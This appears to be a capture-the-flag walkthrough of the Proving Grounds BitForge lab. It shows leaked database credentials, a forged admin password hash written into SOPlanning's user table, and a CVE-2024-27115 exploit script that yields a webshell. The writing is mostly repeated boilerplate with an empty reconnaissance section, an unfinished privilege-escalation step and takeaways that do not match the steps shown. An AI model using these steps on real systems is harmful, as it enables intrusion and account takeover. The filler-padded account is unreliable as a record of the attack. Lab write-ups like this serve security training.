---
title: "Proving Grounds - BitForge (Linux)"
date: 2026-02-25
description: "Proving Grounds BitForge Linux walkthrough covering reconnaissance, initial access, and privilege escalation."
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
---

## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | Web application and exposed network services |
| Primary Entry Vector      | Web RCE (CVE-2024-27115) |
| Privilege Escalation Path | Local enumeration -> misconfiguration abuse -> root |

## Credentials

No credentials obtained.

## Reconnaissance

---
💡 Why this works  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## Initial Foothold

---
![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251211035842.png)
*Caption: Screenshot captured during this stage of the assessment.*

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
mcsam@bitforge.lab
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
git show 18833b811e967ab8bec631344a6809aa4af59480
```

```bash
✅[23:40][CPU:4][MEM:63][TUN0:192.168.45.168][...ome/n0z0/work/pg/BitForge]
🐉 > git show 18833b811e967ab8bec631344a6809aa4af59480
commit 18833b811e967ab8bec631344a6809aa4af59480
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:43:08 2024 +0000

    added the database configuration

diff --git a/db-config.php b/db-config.php
new file mode 100644
index 0000000..c1d2b96
--- /dev/null
+++ b/db-config.php
@@ -0,0 +1,19 @@
+<?php
+// Database configuration
+$dbHost = 'localhost'; // Change if your database is hosted elsewhere
+$dbName = 'bitforge_customer_db';
+$username = 'BitForgeAdmin';
+$password = 'B1tForG3S0ftw4r3S0lutions';
+
+try {
+    $dsn = "mysql:host=$dbHost;dbname=$dbName;charset=utf8mb4";
+    $pdo = new PDO($dsn, $username, $password);
+
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+    echo "Connected successfully to the database!";
+} catch (PDOException $e) {
+    echo "Connection failed: " . $e->getMessage();
+}
+?>
+
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
mysql -h $ip -u BitForgeAdmin -p --skip-ssl
```

```bash
❌[23:46][CPU:3][MEM:64][TUN0:192.168.45.168][...ome/n0z0/work/pg/BitForge]
🐉 > mysql -h $ip -u BitForgeAdmin -p --skip-ssl 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 156
Server version: 8.0.40-0ubuntu0.24.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash

MySQL [soplanning]> SELECT * FROM *;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*' at line 1
MySQL [soplanning]> SELECT * FROM planning_audit;
Empty set (0.089 sec)

MySQL [soplanning]> SELECT * FROM planning_user;
+-----------+----------------+---------------+-------+------------------------------------------+-------+------------------+---------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------------+---------+-----------+--------+--------+-------------+--------------------+-------------+-------------+------------+---------------------+------------+----------+----------------------+
| user_id   | user_groupe_id | nom           | login | password                                 | email | visible_planning | couleur | droits                                                                                                                                                                                                                                          | cle                              | notifications | adresse | telephone | mobile | metier | commentaire | date_dernier_login | preferences | login_actif | google_2fa | date_creation       | date_modif | tutoriel | tarif_horaire_defaut |
+-----------+----------------+---------------+-------+------------------------------------------+-------+------------------+---------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------------+---------+-----------+--------+--------+-------------+--------------------+-------------+-------------+------------+---------------------+------------+----------+----------------------+
| ADM       |           NULL | admin         | admin | 77ba9273d4bcfa9387ae8652377f4c189e5a47ee | NULL  | non              | 000000  | ["users_manage_all", "projects_manage_all", "projectgroups_manage_all", "tasks_modify_all", "tasks_view_all_projects", "lieux_all", "ressources_all", "parameters_all", "stats_users", "stats_projects", "audit_restore", "stats_roi_projects"] | dbee8fd60fd4244695084bd84a996882 | oui           | NULL    | NULL      | NULL   | NULL   | NULL        | NULL               | NULL        | oui         | setup      | 2025-01-16 14:21:15 | NULL       | NULL     |                 NULL |

```

`77ba9273d4bcfa9387ae8652377f4c189e5a47ee`
![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251212002521.png)
*Caption: Screenshot captured during this stage of the assessment.*

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```php
	public function hashPassword($password){
		return sha1("�" . $password . "�");

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
printf '\xA4Password123\xA4' | sha1sum
```

```bash
✅[0:35][CPU:3][MEM:63][TUN0:192.168.45.168][...ome/n0z0/work/pg/BitForge]
🐉 > printf '\xA4Password123\xA4' | sha1sum                                                                                         
58222040a9316af9e4a28381bc173aabfdc41c54  -
```

00000000  c2 a4                                             |..|
00000002
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```sql
MySQL [soplanning]> UPDATE planning_user
    -> SET password = '58222040a9316af9e4a28381bc173aabfdc41c54'
    -> WHERE user_id = 'ADM';
Query OK, 1 row affected (0.092 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251212010327.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251212010337.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251212010357.png)
*Caption: Screenshot captured during this stage of the assessment.*

https://github.com/theexploiters/CVE-2024-27115-Exploit
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
python3 SOPlanning-1.52.01-RCE-Exploit.py -t http://plan.bitforge.lab/www -u admin -p Password123
```

```bash
❌[1:15][CPU:4][MEM:59][TUN0:192.168.45.168][...ge/CVE-2024-27115-Exploit]
🐉 > python3 SOPlanning-1.52.01-RCE-Exploit.py -t http://plan.bitforge.lab/www -u admin -p Password123
[+] Uploaded ===> File 'hfj.php' was added to the task !
[+] Exploit completed.
Access webshell here: http://plan.bitforge.lab/www/upload/files/h13wii/hfj.php?cmd=<command>
Do you want an interactive shell? (yes/no) yes
soplaning:~$ 
```

════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
2025/12/11 17:46:01 CMD: UID=0     PID=30058  | /bin/sh -c mysqldump -u jack -p'j4cKF0rg3@445' soplanning >> /opt/backup/soplanning_dump.log 2>&1   

```

💡 Why this works  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## Privilege Escalation

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
sudo -l
```

```bash
jack@BitForge:~$ sudo -l
Matching Defaults entries for jack on bitforge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !env_reset

User jack may run the following commands on bitforge:
    (root) NOPASSWD: /usr/bin/flask_password_changer
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat /usr/bin/flask_password_changer
```

```bash
jack@BitForge:~$ cat /usr/bin/flask_password_changer

```

💡 Why this works  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## Lessons Learned / Key Takeaways

- Validate framework debug mode and error exposure in production-like environments.
- Restrict file permissions on scripts and binaries executed by privileged users or schedulers.
- Harden sudo policies to avoid wildcard command expansion and scriptable privileged tools.
- Treat exposed credentials and environment files as critical secrets.

## References

- CVE-2024-27115: https://nvd.nist.gov/vuln/detail/CVE-2024-27115
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
